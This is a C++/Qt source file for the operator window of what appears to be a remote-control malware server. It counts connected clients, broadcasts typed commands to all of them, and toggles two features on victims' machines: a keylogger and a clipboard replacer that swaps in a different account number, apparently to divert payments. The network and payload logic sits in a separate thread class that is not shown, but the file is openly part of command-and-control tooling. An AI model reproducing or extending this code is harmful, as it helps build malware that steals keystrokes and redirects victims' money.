#include "server.h"
#include "ui_server.h"
#include "serverthread.h"
#include <QString>
#include <iostream>
#include <QColor>
server::server(QWidget *parent): QMainWindow(parent), ui(new Ui::server), isStop(false)
{
    ui->setupUi(this);
    mainServerThread = new serverThread(this,false);
    mainServerThread->accountNumberToChange = "Account number has been successfully changed!";
    clipboardChange = false;
    keyloggerChange = false;
    // connect signal/slot
    connect(mainServerThread, SIGNAL(changeCountOfClients(int)), this, SLOT(onChangeCountOfClients(int)));
    connect(mainServerThread, SIGNAL(changeProgressBarValue(int)), this, SLOT(onChangeProgressBarValue(int)));
    connect(mainServerThread, SIGNAL(appendConsoleLog(std::string,std::string)),this,SLOT(onAppendConsoleLog(std::string,std::string)));

    connect(mainServerThread, SIGNAL(lastCommandChangeValue(std::string)), this, SLOT(onLastCommandChangeValue(std::string)));

    connect(mainServerThread, SIGNAL(lastCommandGetValue()), this, SLOT(onLastCommandGetValue()));

    countOfClients = 0;
    valueOfProgressBar = 0;
    lastCommand = "";
    ui->progressBarServerStart->reset();
    ui->progressBarServerStart->setValue(valueOfProgressBar);
    ui->progressBarServerStart->setFormat("Server is not running!");
    ui->consoleLog->setDisabled(true);
    ui->countOfClients->setDisabled(true);
    ui->lastCommand->setDisabled(true);
    ui->stopClientsConnectionBtn->setDisabled(true);
    ui->sendAgainBtn->setDisabled(true);
    ui->input->setDisabled(true);
    ui->clipboardReplace->setDisabled(true);
    ui->keyLogger->setDisabled(true);
}

server::~server()
{
    delete ui;
}

void server::onChangeCountOfClients(int count)
{
    this->countOfClients += count;
    ui->countOfClients->setText("Count of clients: " + QString::number(countOfClients));
}

void server::onAppendConsoleLog(std::string from, std::string what){
    QString msg = QString::fromStdString(from + ": " + what);
    ui->consoleLog->appendHtml(msg);
}

void server::onLastCommandChangeValue(std::string command){
    lastCommand = command;
    QString com = QString::fromStdString("Last command sent to all clients: " + lastCommand);
    ui->lastCommand->setText(com);
}

std::string server::onLastCommandGetValue(){
    return lastCommand;
}

void server::onChangeProgressBarValue(int count)
{
    this->valueOfProgressBar = count;
    ui->progressBarServerStart->setValue(valueOfProgressBar);
    if(valueOfProgressBar < 100){
        ui->progressBarServerStart->setFormat(QString::number(valueOfProgressBar)+"%");
    }
    else{
//      ui->progressBarServerStart->setStyleSheet("");
        ui->progressBarServerStart->setFormat("Server is running!");
    }
    if(valueOfProgressBar >= 50){
        ui->progressBarServerStart->setStyleSheet("QProgressBar"
                                                  " { border: 2px solid grey; border-radius: 5px; color: black; font-family: Optima, Segoe, Segoe UI, Candara, Calibri, Arial, sans-serif; font-size:16px; }"
                                                  "QProgressBar::chunk "
                                                  " { background-color: #76FF7A; width: 20px; } "
                                                  "QProgressBar "
                                                  " { border: 2px solid grey; border-radius: 5px; text-align: center; }");
    }
    else{
        ui->progressBarServerStart->setStyleSheet("QProgressBar"
                                                  " { border: 2px solid grey; border-radius: 5px; color: #F5F5F5; font-family: Optima, Segoe, Segoe UI, Candara, Calibri, Arial, sans-serif; font-size:16px; }"
                                                  "QProgressBar::chunk "
                                                  " { background-color: #76FF7A; width: 20px; } "
                                                  "QProgressBar "
                                                  " { border: 2px solid grey; border-radius: 5px; text-align: center; }");
    }
}


void server::on_startButton_clicked()
{
    if(isStop){

        ui->consoleLog->setDisabled(true);
        ui->countOfClients->setDisabled(true);
        ui->lastCommand->setDisabled(true);
        ui->stopClientsConnectionBtn->setDisabled(true);
        ui->sendAgainBtn->setDisabled(true);
        ui->input->setDisabled(true);
        ui->clipboardReplace->setDisabled(true);
        ui->keyLogger->setDisabled(true);

        ui->progressBarServerStart->setDisabled(true);
        mainServerThread->stopOnlyClients = false;
        mainServerThread->Stop = true;
        mainServerThread->wait();
        this->onChangeProgressBarValue(0);
        ui->progressBarServerStart->setFormat("Server is not running!");
        ui->startButton->setText("Start");
        ui->progressBarServerStart->setDisabled(false);


    }
    else{
        ui->consoleLog->setDisabled(false);
        ui->countOfClients->setDisabled(false);
        ui->lastCommand->setDisabled(false);
        ui->stopClientsConnectionBtn->setDisabled(false);
        ui->sendAgainBtn->setDisabled(false);
        ui->input->setDisabled(false);
        ui->clipboardReplace->setDisabled(false);
        ui->keyLogger->setDisabled(false);

        mainServerThread->start();
        ui->startButton->setText("Stop");

    }
    isStop = !isStop;
}


void server::on_stopClientsConnectionBtn_clicked()
{
    mainServerThread->stopOnlyClients = true;
    mainServerThread->Stop = true;

}

void server::on_sendAgainBtn_clicked(){
    mainServerThread->needToSendAgain = this->lastCommand;
}

void server::on_input_returnPressed(){
    this->lastCommand = ui->input->text().toStdString();
    ui->input->setText("");
    mainServerThread->newCommand = this->lastCommand;
}


void server::on_clipboardReplace_clicked(){
    this->clipboardChange = !this->clipboardChange;
    mainServerThread->needToChangeAccountNumber = clipboardChange;
}


void server::on_keyLogger_clicked()
{
    this->keyloggerChange = !this->keyloggerChange;
    mainServerThread->needToSendKeylogger = keyloggerChange;
}

